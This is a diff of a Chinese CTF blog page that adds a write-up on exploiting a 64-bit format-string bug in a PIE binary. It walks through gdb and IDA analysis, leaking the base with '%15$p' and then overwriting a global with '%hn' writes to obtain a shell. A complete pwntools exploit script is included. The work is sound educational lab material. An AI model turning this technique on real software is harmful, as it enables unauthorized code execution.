@@ -64,6 +64,64 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-64位格式化字符串-修改一个值就行" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/" class="article-date">
+  <time datetime="2023-05-30T12:11:54.386Z" itemprop="datePublished">2023-05-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/">64位格式化字符串:修改一个值就行</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="参考博客-http-liul14n-top-2019-11-26-NCTF-2019"><a href="#参考博客-http-liul14n-top-2019-11-26-NCTF-2019" class="headerlink" title="参考博客: http://liul14n.top/2019/11/26/NCTF-2019/"></a>参考博客: <a target="_blank" rel="noopener" href="http://liul14n.top/2019/11/26/NCTF-2019/">http://liul14n.top/2019/11/26/NCTF-2019/</a></h2><h2 id="查看程序保护"><a href="#查看程序保护" class="headerlink" title="查看程序保护"></a>查看程序保护</h2><p>什么保护都开了，只有RELRO是半开的，我们可以考虑尝试更改got表来获得shell。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">博客原话:首先是对于开启<span class="variable constant_">PIE</span>保护的文件,如果我们要使用gdb调试的话,需要这么下断点:</span><br><span class="line">b *$rebase(相对基址偏移),这个相对基址偏移可以在<span class="variable constant_">IDA</span>中看到,就是在<span class="variable constant_">IDA</span>里面看到的指令地址。但是需要gdb运行程序以后才能下断,gdb里面r了以后程序会直接运行下去,一般来说程序都有提示输入的函数,这时候我们先r然后直接<span class="title class_">Ctrl</span> + C,然后下断即可。</span><br></pre></td></tr></table></figure>
+<p> <img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602173020.png" alt="Alt text"></p>
+<h2 id="gdb中获得基址"><a href="#gdb中获得基址" class="headerlink" title="gdb中获得基址"></a>gdb中获得基址</h2><p> 由于开启了pie保护，我们需要在gdb中获得基址:0x555555554000<br> 真实地址 = 基址 + 偏移<br> <img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602202831.png" alt="Alt text"></p>
+<h2 id="确认泄露基址的格式化字符串参数偏移"><a href="#确认泄露基址的格式化字符串参数偏移" class="headerlink" title="确认泄露基址的格式化字符串参数偏移"></a>确认泄露基址的格式化字符串参数偏移</h2><p>这里查看第一次输入后栈上的内容，选取一个和基址差不多的地址确定偏移来泄露(这种一般都和基址有关且固定不变的)，偏移为15<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602210106.png" alt="Alt text"></p>
+<h2 id="ida打开程序"><a href="#ida打开程序" class="headerlink" title="ida打开程序"></a>ida打开程序</h2><p>我们可以看到，只要让地址:dword_2020E0中的值=1717986918我们就可以获得shell了。<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602180314.png" alt="Alt text"><br>发现sub_B30出现格式化字符串<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602190949.png" alt="Alt text"><br>sub_C54中strncpy把src中的0x10个字符复制到dest之中，不够的拿空字节填充。<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602191631.png" alt="Alt text"><br>src中存放了15个字符:preparing……<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602192049.png" alt="Alt text"></p>
+<p>sub_BD6又发现一个格式化字符串漏洞，而且可以用来泄露地址<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602191230.png" alt="Alt text"><br>我们可以发现sub_BD6和sub_B30中的buf和sub_C54中的dest中存放数据的位置是同一个位置。所以在strncpy函数复制的时候，preparing……会覆盖此前写在buf中的前15个字符。<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602191112.png" alt="Alt text"><br>sub_B9D中发现关键函数!<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602192825.png" alt="Alt text"><br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602192949.png" alt="Alt text"></p>
+<h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><p>发现有两次输出机会，第一次输出看不到格式化字符串参数的偏移，第二次的偏移为6。<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602194014.png" alt="Alt text"><br>再连续俩次运行程序，第一次运行的时候第一次输入八个A第二次运行的时候第一次输入23个A。<br>可以发现第一次输入的八个A根本没有输出到屏幕上，而第二次输出的23个A有7个输出到了屏幕上。这说明strncpy把src中的0x10个字符复制到dest之中,而dest与buf存储的位置又相同，所以src复制过来的0x10个字符把我们输入到buf的前16个字符给覆盖成了preparing……<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602195535.png" alt="Alt text"></p>
+<h2 id="gdb查看格式化字符串参数偏移"><a href="#gdb查看格式化字符串参数偏移" class="headerlink" title="gdb查看格式化字符串参数偏移"></a>gdb查看格式化字符串参数偏移</h2><p>这里我们在第一次输入的位置输入了24个A，按理来说应该会有8个A没有被覆盖，由于64位程序中printf函数的前6个参数都存放在了寄存器里，所以在栈上我们要从6开始数，则格式化字符串函数偏移为8<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602201637.png" alt="Alt text"></p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第一次输入:用于泄露程序的相对基址，通过gdb查看栈上的分布可以确定泄露的偏移。泄露之后就可以得到dword_2020E0的真实地址了。</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&quot;debug&quot;</span></span><br><span class="line">payload = b<span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + b<span class="string">&quot;%15$p&quot;</span></span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;your name:&quot;</span>,payload)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(b<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">base_addr = <span class="title function_">int</span>(io.<span class="title function_">recv</span>(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0xccd</span></span><br><span class="line">##需要减<span class="number">0xccd</span>因为在栈上看到的基址低三位全为<span class="number">0</span>。</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(base_addr))</span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,<span class="string">&quot;b printf&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line">system_addr = <span class="number">0x2020e0</span> + base_addr#得到真实地址</span><br><span class="line">payload2 = b<span class="string">&quot;%26214c%10$hn%11$hn&quot;</span>.<span class="title function_">ljust</span>(<span class="number">32</span>,<span class="string">&quot;a&quot;</span>) + <span class="title function_">p64</span>(system_addr) + <span class="title function_">p64</span>(system_addr+<span class="number">2</span>)</span><br><span class="line">io.<span class="title function_">sendlineafter</span>(b<span class="string">&quot;what do you want?\n&quot;</span>,payload2)</span><br><span class="line">io.<span class="title function_">interactive</span>()</span><br></pre></td></tr></table></figure>
+
+<h2 id="收获了什么"><a href="#收获了什么" class="headerlink" title="收获了什么"></a>收获了什么</h2><ol>
+<li><p>在知道了这道题开启了pie保护并且在ida看到了程序上的第地址都只有三个有效数字而已，我们就应该要知道通过在gdb里面pie获取基址从而得到真正的地址。<br><img src="/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230602220217.png" alt="Alt text"></p>
+</li>
+<li><p>在构造这道题的脚本的payload2的之后，在地址的栈对齐的问题上我浪费了很多时间，但是其实最后只要：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b<span class="string">&quot;%26214c%10$hn%11$hn&quot;</span>.<span class="title function_">ljust</span>(<span class="number">32</span>,<span class="string">&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>这段代码的意思是在我输入的格式化字符串的右边(后面)，不断地填充a直到填充的a加上前面的格式化字符串达到32个字符，刚好是俩个地址的大小不多不少。这样就能避免了栈对齐的问题了。</p>
+</li>
+<li><p>strncpy函数</p>
+</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://dinkjun.github.io/2023/05/30/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-%E4%BF%AE%E6%94%B9%E4%B8%80%E4%B8%AA%E5%80%BC%E5%B0%B1%E8%A1%8C/" data-id="clizyehvx0009ikv903xv5373" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-shaokao" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/05/29/shaokao/" class="article-date">
@@ -98,7 +156,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="clizn4521000b78v9hpat5f6b" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/29/shaokao/" data-id="clizyehvy000bikv9ht495r4f" class="article-share-link">Share</a>
       
       
     </footer>
@@ -159,7 +217,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="clizn451z000978v9e5on7ly1" class="article-share-link">Share</a>
+      <a data-url="https://dinkjun.github.io/2023/05/29/canary%E7%88%86%E7%A0%B4/" data-id="clizyehvx000aikv9bwdhb11x" class="article-share-link">Share</a>
       
       
     </footer>
@@ -205,6 +263,10 @@
       <ul>
         
           <li>
+            <a href="/2023/06/17/32%E4%BD%8Dshellcode%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cshellcode/">32位shellcode使用mprotect提升权限执行shellcode</a>
+          </li>
+        
+          <li>
             <a href="/2023/06/17/32%E4%BD%8Dshellcode-%E7%BB%95%E8%BF%87strcmp%E5%87%BD%E6%95%B0%E5%92%8C%E8%AE%A1%E7%AE%97shellcode%E5%9C%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E5%81%8F%E7%A7%BB%E3%80%82/">32位shellcode:绕过strcmp函数和计算shellcode在栈上的偏移。</a>
           </li>
         
@@ -218,10 +280,6 @@
         
           <li>
             <a href="/2023/06/04/32%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2bss/">32位格式化字符串bss</a>
-          </li>
-        
-          <li>
-            <a href="/2023/06/03/64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B9%8B%E4%BF%AE%E6%94%B9%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80/">64位格式化字符串之修改返回地址</a>
           </li>
         
       </ul>
